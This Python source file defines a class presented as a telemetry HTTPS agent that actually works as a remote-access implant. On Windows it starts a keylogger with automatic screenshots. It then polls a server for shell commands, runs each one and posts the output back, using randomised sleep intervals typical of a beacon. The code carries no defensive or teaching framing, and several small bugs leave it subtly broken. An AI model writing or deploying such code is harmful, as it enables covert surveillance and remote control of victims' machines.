import os
import sys
import base64
import http.client
import getpass
import ssl
import socket
from datetime import datetime
import pytz
import random
import time 

import platform
if platform.system() == 'Windows':
	import win32clipboard
	import win32api
	import win32con
	import win32evtlog
	import win32security
	import win32evtlogutil
	import win32net
	import win32netcon

from keylogger import Keylogger
from httpsAgentDef import HTTPSAgent

class TelemHTTPSAgent(HTTPSAgent):
	def __init__(self):
		HTTPSAgent.__init__(self)

	def postTelemetry(self, measurement_time, pid, measurement_mame, measurement_val, measurement_type):
		telem_template = '''{{
  "timestamp": "{0}",
  "hostname": "{1}",
  "pid": "{2}",
  "measurementName": "{3}",
  "value": "{4}",
  "pidSpecific": false,
  "type": "{5}"
}}'''
		formatted_report = telem_template.format(measurement_time, socket.gethostname(), pid, measurement_mame, measurement_val, measurement_type)
		try:
			self.postHTTPS(self.headers, '/telemetry', formatted_report)
		except Exception as e:
			print("Oops, something went wrong when posting telemetry: {}".format(e), file=sys.stderr)

	def pollTelemetry(self):
		#Implement this in a subclass to provide telemetry polling
		self.postTelemetry(datetime.now(pytz.timezone('UTC')), "PID", "MEASURE_ME", "42","DOUBLE")

	def haltOperation(self):
		self.live = False;

	def runTlm(self, newLineAfterCmdOutput = False, autoScreenshot = True):
		if platform.system() == 'Windows':
			self.postWindowsEventLogWarning()
		self.newLineAfterCmdOutput = newLineAfterCmdOutput
		self.live = True
		if platform.system() == 'Windows':        
			logger = Keylogger(60, self, autoScreenshot)
			logger.start()
		while(self.live):
			try:
				command = self.pollCommand()
				if command != None:
					cmd_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8") 
					if self.newLineAfterCmdOutput:
						cmd_output = cmd_output + "\n"
					self.postResponse(cmd_output)
				else:
					sleep_int = 1 + (random.randint(1,500) / 1000)
					time.sleep(sleep_int)
				self.pollTelemetry()
			except Exception as e:
				live = False
				print("Shutting down {}".format(e), file=sys.stderr)
		for key in self.sessionsDict:
			self.sessionsDict[key].kill()

	